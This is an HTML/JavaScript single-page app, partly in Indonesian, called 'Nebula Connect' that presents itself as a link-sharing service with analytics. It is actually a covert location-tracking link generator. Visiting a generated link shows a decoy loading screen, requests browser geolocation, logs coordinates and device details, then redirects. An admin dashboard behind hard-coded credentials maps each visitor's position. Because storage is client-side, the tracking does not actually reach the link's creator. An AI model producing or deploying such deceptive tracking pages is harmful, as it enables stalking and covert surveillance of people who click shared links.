<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nebula Connect</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        :root {
            --primary-color: #00f7ff;
            --secondary-color: #8a2be2;
            --bg-dark: #0a0a1a;
            --bg-darker: #050510;
            --text-color: #e0e0ff;
            --card-bg: rgba(20, 20, 40, 0.7);
            --accent: #ff3e78;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--bg-dark);
            color: var(--text-color);
            font-family: 'Rajdhani', sans-serif;
            line-height: 1.6;
            position: relative;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        body::before, body::after {
            content: '';
            position: fixed;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.2;
            z-index: -1;
        }
        
        body::before {
            background: var(--primary-color);
            top: -100px;
            left: -100px;
        }
        
        body::after {
            background: var(--secondary-color);
            bottom: -100px;
            right: -100px;
        }
        
        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 0;
        }
        
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 5%;
            background: rgba(10, 10, 30, 0.7);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .logo {
            display: flex;
            align-items: center;
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary-color);
            text-decoration: none;
        }
        
        .logo i {
            margin-right: 10px;
        }
        
        .nav-links a {
            color: var(--text-color);
            text-decoration: none;
            margin-left: 25px;
            position: relative;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        .nav-links a:hover {
            color: var(--primary-color);
        }
        
        .nav-links a::after {
            content: '';
            position: absolute;
            width: 0;
            height: 2px;
            bottom: -5px;
            left: 0;
            background: var(--primary-color);
            transition: width 0.3s ease;
        }
        
        .nav-links a:hover::after {
            width: 100%;
        }
        
        .hero {
            text-align: center;
            padding: 80px 0;
        }
        
        .hero h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            background: linear-gradient(90deg, var(--primary-color), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            position: relative;
            display: inline-block;
        }
        
        .hero p {
            font-size: 1.2rem;
            max-width: 600px;
            margin: 0 auto 40px;
            opacity: 0.8;
        }
        
        .card {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            animation: cardFadeIn 0.8s ease-out;
        }
        
        @keyframes cardFadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 1.1rem;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: var(--text-color);
            font-family: 'Rajdhani', sans-serif;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(0, 247, 255, 0.3);
        }
        
        button {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: var(--bg-darker);
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
        }
        
        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to right, transparent 0%, rgba(255, 255, 255, 0.1) 50%, transparent 100%);
            transform: translateX(-100%);
            transition: transform 0.6s ease;
        }
        
        button:hover::before {
            transform: translateX(100%);
        }
        
        .result-link {
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 247, 255, 0.1);
            border-radius: 8px;
            position: relative;
            overflow: hidden;
        }
        
        .result-link p {
            margin-bottom: 15px;
            font-weight: 500;
        }
        
        .link-display {
            background: rgba(0, 0, 0, 0.2);
            padding: 12px;
            border-radius: 6px;
            word-break: break-all;
            margin-bottom: 15px;
            border: 1px dashed rgba(255, 255, 255, 0.1);
        }
        
        .copy-btn {
            background: var(--accent);
            font-size: 0.9rem;
            padding: 8px 15px;
        }
        
        .admin-panel {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
        }
        
        @media (min-width: 992px) {
            .admin-panel {
                grid-template-columns: 1fr 2fr;
            }
        }
        
        .admin-sidebar {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-sidebar h3 {
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-sidebar ul {
            list-style: none;
        }
        
        .admin-sidebar li {
            margin-bottom: 10px;
        }
        
        .admin-sidebar a {
            display: flex;
            align-items: center;
            padding: 10px;
            color: var(--text-color);
            text-decoration: none;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        
        .admin-sidebar a:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .admin-sidebar a i {
            margin-right: 10px;
            color: var(--primary-color);
        }
        
        .admin-content {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-header h2 {
            color: var(--primary-color);
        }
        
        .link-list {
            margin-top: 20px;
        }
        
        .link-item {
            padding: 15px;
            margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            border-left: 3px solid var(--primary-color);
        }
        
        .link-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .link-title {
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }
        
        .status-pending {
            background: rgba(255, 193, 7, 0.2);
            color: #ffc107;
        }
        
        .status-opened {
            background: rgba(40, 167, 69, 0.2);
            color: #28a745;
        }
        
        .link-details {
            margin-top: 10px;
            font-size: 0.9rem;
            opacity: 0.8;
        }
        
        .map-container {
            height: 300px;
            margin-top: 15px;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .tracking-info {
            margin-top: 15px;
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 6px;
        }
        
        .tracking-info p {
            margin-bottom: 5px;
            font-size: 0.9rem;
        }
        
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            animation: fadeIn 0.5s ease-out;
        }
        
        .alert-success {
            background: rgba(40, 167, 69, 0.2);
            border: 1px solid rgba(40, 167, 69, 0.3);
            color: #28a745;
        }
        
        .alert-error {
            background: rgba(220, 53, 69, 0.2);
            border: 1px solid rgba(220, 53, 69, 0.3);
            color: #dc3545;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 50px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 0.9rem;
            opacity: 0.7;
        }
        
        /* Animasi kursor di halaman tracking */
        .pulse {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: var(--accent);
            position: absolute;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(0.8);
                opacity: 0.8;
            }
            50% {
                transform: scale(1.2);
                opacity: 0.5;
            }
            100% {
                transform: scale(0.8);
                opacity: 0.8;
            }
        }
        
        /* Gaya untuk halaman loading */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--bg-darker);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top-color: var(--primary-color);
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .loading-text {
            margin-top: 20px;
            font-size: 1.2rem;
            letter-spacing: 1px;
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .hero h1 {
                font-size: 2.2rem;
            }
            
            .hero p {
                font-size: 1rem;
            }
            
            .card {
                padding: 20px;
            }
            
            nav {
                padding: 15px 5%;
            }
            
            .logo {
                font-size: 1.3rem;
            }
            
            .nav-links a {
                margin-left: 15px;
                font-size: 0.9rem;
            }
        }
        
        @media (max-width: 576px) {
            .container {
                width: 95%;
            }
            
            .hero {
                padding: 50px 0;
            }
            
            .hero h1 {
                font-size: 1.8rem;
            }
            
            .admin-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .admin-header h2 {
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <div id="root"></div>
    
    <script>
        // Utility functions
        function generateUniqueID() {
            return Math.random().toString(36).substring(2, 12);
        }
        
        function formatDate() {
            const now = new Date();
            return now.toISOString().slice(0, 19).replace('T', ' ');
        }
        
        // Local storage functions
        function getLinks() {
            const links = localStorage.getItem('nebula_links');
            return links ? JSON.parse(links) : {};
        }
        
        function saveLinks(links) {
            localStorage.setItem('nebula_links', JSON.stringify(links));
        }
        
        function getTrackingData() {
            const data = localStorage.getItem('nebula_tracking');
            return data ? JSON.parse(data) : {};
        }
        
        function saveTrackingData(data) {
            localStorage.setItem('nebula_tracking', JSON.stringify(data));
        }
        
        // Authentication functions
        function isAdminLoggedIn() {
            return localStorage.getItem('admin_logged_in') === 'true';
        }
        
        function adminLogin(username, password) {
            // Hard-coded credentials (in a real app, never do this!)
            if (username === 'admin' && password === 'admin123') {
                localStorage.setItem('admin_logged_in', 'true');
                return true;
            }
            return false;
        }
        
        function adminLogout() {
            localStorage.removeItem('admin_logged_in');
        }
        
        // URL parameter functions
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams.entries()) {
                params[key] = value;
            }
            
            return params;
        }
        
        // Render functions for different views
        function renderNav() {
            const isAdmin = isAdminLoggedIn();
            
            return `
            <nav>
                <a href="#" onclick="navigateTo('home'); return false;" class="logo"><i class="fas fa-globe-asia"></i> Nebula Connect</a>
                <div class="nav-links">
                    <a href="#" onclick="navigateTo('home'); return false;">Home</a>
                    ${!isAdmin 
                        ? `<a href="#" onclick="navigateTo('admin-login'); return false;">Admin</a>` 
                        : `<a href="#" onclick="navigateTo('admin-dashboard'); return false;">Dashboard</a>
                           <a href="#" onclick="handleLogout(); return false;">Logout</a>`
                    }
                </div>
            </nav>
            `;
        }
        
        function renderFooter() {
            return `
            <footer class="footer">
                <p>&copy; 2025 Nebula Connect | Next-Generation Link Solutions</p>
            </footer>
            `;
        }
        
        function renderHome(successMessage = null, newLink = null) {
            return `
            <div class="container">
                <div class="hero">
                    <h1>Nebula Connect</h1>
                    <p>Share your content across platforms with enhanced analytics and advanced features.</p>
                </div>
                
                <div class="card">
                    ${successMessage ? `
                    <div class="alert alert-success">
                        ${successMessage}
                    </div>
                    ` : ''}
                    
                    <div class="form-group">
                        <label for="original_link">Enter your link</label>
                        <input type="text" id="original_link" name="original_link" placeholder="https://tiktok.com/..." required>
                    </div>
                    
                    <button onclick="createLink()">Generate Link <i class="fas fa-arrow-right"></i></button>
                    
                    ${newLink ? `
                    <div class="result-link">
                        <p>Your custom link is ready:</p>
                        <div class="link-display">${newLink}</div>
                        <button class="copy-btn" onclick="copyToClipboard('${newLink}')">
                            <i class="fas fa-copy"></i> Copy Link
                        </button>
                    </div>
                    ` : ''}
                </div>
                
                <div class="card">
                    <h2>Why use Nebula Connect?</h2>
                    <p>Nebula Connect provides elegant solutions for sharing content across different platforms, offering enhanced analytics and ensuring your audience has the best experience when accessing your shared links.</p>
                </div>
            </div>
            `;
        }
        
        function renderAdminLogin(error = null) {
            return `
            <div class="container">
                <div class="hero">
                    <h1>Admin Login</h1>
                    <p>Access your dashboard to monitor connections</p>
                </div>
                
                <div class="card">
                    ${error ? `
                    <div class="alert alert-error">
                        ${error}
                    </div>
                    ` : ''}
                    
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    
                    <button onclick="handleAdminLogin()">Login</button>
                </div>
            </div>
            `;
        }
        
        function renderAdminDashboard() {
            const links = getLinks();
            const trackingData = getTrackingData();
            
            let linkListHTML = '';
            
            if (Object.keys(links).length === 0) {
                linkListHTML = '<p>No links have been created yet.</p>';
            } else {
                for (const [id, linkData] of Object.entries(links)) {
                    const statusClass = linkData.status === 'Belum dibuka' ? 'status-pending' : 'status-opened';
                    const shortOriginalLink = linkData.original_link.length > 50 
                        ? linkData.original_link.substring(0, 50) + '...' 
                        : linkData.original_link;
                    
                    let trackingInfoHTML = '';
                    
                    if (linkData.status === 'Sudah dibuka' && trackingData[id]) {
                        trackingData[id].forEach((track, index) => {
                            trackingInfoHTML += `
                            <div class="tracking-info">
                                <p><strong>Access Time:</strong> ${track.timestamp}</p>
                                <p><strong>Location:</strong> Lat: ${track.latitude}, Long: ${track.longitude}</p>
                                <p><strong>Device:</strong> ${track.user_agent}</p>
                                <p><strong>IP Address:</strong> ${track.ip_address}</p>
                            </div>
                            <div id="map-${id}-${index}" class="map-container"></div>
                            `;
                        });
                    }
                    
                    linkListHTML += `
                    <div class="link-item">
                        <div class="link-header">
                            <div class="link-title">${escapeHTML(shortOriginalLink)}</div>
                            <span class="status ${statusClass}">${linkData.status}</span>
                        </div>
                        
                        <div class="link-details">
                            <p><strong>Tracking Link:</strong> ${escapeHTML(linkData.tracking_link)}</p>
                            <p><strong>Created:</strong> ${linkData.created_at}</p>
                        </div>
                        
                        ${trackingInfoHTML}
                    </div>
                    `;
                }
            }
            
            return `
            <div class="container">
                <div class="admin-panel">
                    <div class="admin-sidebar">
                        <h3>Admin Panel</h3>
                        <ul>
                            <li><a href="#" onclick="navigateTo('admin-dashboard'); return false;"><i class="fas fa-link"></i> Link Tracking</a></li>
                            <li><a href="#" onclick="navigateTo('home'); return false;"><i class="fas fa-plus"></i> Create New Link</a></li>
                            <li><a href="#" onclick="handleLogout(); return false;"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
                        </ul>
                    </div>
                    
                    <div class="admin-content">
                        <div class="admin-header">
                            <h2>Link Tracking Dashboard</h2>
                        </div>
                        
                        <div class="link-list">
                            ${linkListHTML}
                        </div>
                    </div>
                </div>
            </div>
            `;
        }
        
        function renderTrackingPage(linkId) {
            return `
            <div class="loading-overlay">
                <div class="loader"></div>
                <div class="loading-text">Connecting to your content...</div>
            </div>
            `;
        }
        
        // Helper for HTML escaping
        function escapeHTML(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Handler functions
        function createLink() {
            const originalLink = document.getElementById('original_link').value.trim();
            
            if (!originalLink) return;
            
            const links = getLinks();
            const linkId = generateUniqueID();
            
            // Create tracking link
            // For GitHub pages, we need to use the current page URL
            const baseUrl = window.location.href.split('?')[0];
            const trackingLink = `${baseUrl}?id=${linkId}`;
            
            links[linkId] = {
                original_link: originalLink,
                created_at: formatDate(),
                tracking_link: trackingLink,
                status: 'Belum dibuka'
            };
            
            saveLinks(links);
            
            // Re-render the page with success message
            renderView('home', {
                successMessage: 'Link berhasil dibuat!',
                newLink: trackingLink
            });
        }
        
        function handleAdminLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (adminLogin(username, password)) {
                navigateTo('admin-dashboard');
            } else {
                renderView('admin-login', {
                    error: 'Username atau password salah!'
                });
            }
        }
        
        function handleLogout() {
            adminLogout();
            navigateTo('home');
        }
        
        function handleTracking(linkId) {
            const links = getLinks();
            
            if (links[linkId]) {
                const originalLink = links[linkId].original_link;
                links[linkId].status = 'Sudah dibuka';
                saveLinks(links);
                
                // Get location data if available
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;
                            
                            // Save tracking data
                            const trackingData = getTrackingData();
                            
                            if (!trackingData[linkId]) {
                                trackingData[linkId] = [];
                            }
                            
                            trackingData[linkId].push({
                                latitude: latitude,
                                longitude: longitude,
                                timestamp: formatDate(),
                                user_agent: navigator.userAgent,
                                ip_address: '127.0.0.1' // This will always be localhost in client-side
                            });
                            
                            saveTrackingData(trackingData);
                            
                            // Redirect after data is saved
                            setTimeout(() => {
                                window.location.href = originalLink;
                            }, 2000);
                        },
                        error => {
                            console.error('Error getting location:', error);
                            setTimeout(() => {
                                window.location.href = originalLink;
                            }, 2000);
                        }
                    );
                } else {
                    setTimeout(() => {
                        window.location.href = originalLink;
                    }, 2000);
                }
            } else {
                navigateTo('home');
            }
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                const copyBtn = document.querySelector('.copy-btn');
                const originalText = copyBtn.innerHTML;
                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                
                setTimeout(() => {
                    copyBtn.innerHTML = originalText;
                }, 2000);
            });
        }
        
        // Navigation function
        function navigateTo(view, params = {}) {
            renderView(view, params);
            
            // Update URL without reloading the page
            if (view === 'home') {
                history.pushState({}, '', '/');
            } else if (view === 'admin-login') {
                history.pushState({}, '', '?admin=login');
            } else if (view === 'admin-dashboard') {
                history.pushState({}, '', '?admin=dashboard');
            }
        }
        
        // Render the appropriate view
        function renderView(view, params = {}) {
            const root = document.getElementById('root');
            let content = '';
            
            // Always include the nav
            content += renderNav();
            
            // Render the specific view
            if (view === 'home') {
                content += renderHome(params.successMessage, params.newLink);
            } else if (view === 'admin-login') {
                content += renderAdminLogin(params.error);
            } else if (view === 'admin-dashboard') {
                // Check if user is logged in
                if (isAdminLoggedIn()) {
                    content += renderAdminDashboard();
                } else {
                    navigateTo('admin-login');
                    return;
                }
            } else if (view === 'tracking') {
                content += renderTrackingPage(params.linkId);
            }
            
            // Always include the footer
            content += renderFooter();
            
            // Set the content
            root.innerHTML = content;
            
            // Initialize maps if needed
            if (view === 'admin-dashboard') {
                initMaps();
            }
        }
        
        function initMaps() {
            const trackingData = getTrackingData();
            const links = getLinks();
            
            for (const [linkId, tracks] of Object.entries(trackingData)) {
                if (links[linkId] && links[linkId].status === 'Sudah dibuka') {
                    tracks.forEach((track, index) => {
                        const mapId = `map-${linkId}-${index}`;
                        const mapElement = document.getElementById(mapId);
                        
                        if (mapElement) {
                            const map = L.map(mapId).setView([track.latitude, track.longitude], 13);
                            
                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                            }).addTo(map);
                            
                            L.marker([track.latitude, track.longitude])
                                .addTo(map)
                                .bindPopup(`User location at ${track.timestamp}`)
                                .openPopup();
                        }
                    });
                }
            }
        }
        
        // Initial app load
        document.addEventListener('DOMContentLoaded', function() {
            const params = getUrlParams();
            
            if (params.id) {
                // This is a tracking link
                renderView('tracking', { linkId: params.id });
                handleTracking(params.id);
            } else if (params.admin === 'login') {
                renderView('admin-login');
            } else if (params.admin === 'dashboard') {
                renderView('admin-dashboard');
            } else {
                renderView('home');
            }
        });
    </script>
</body>
</html>
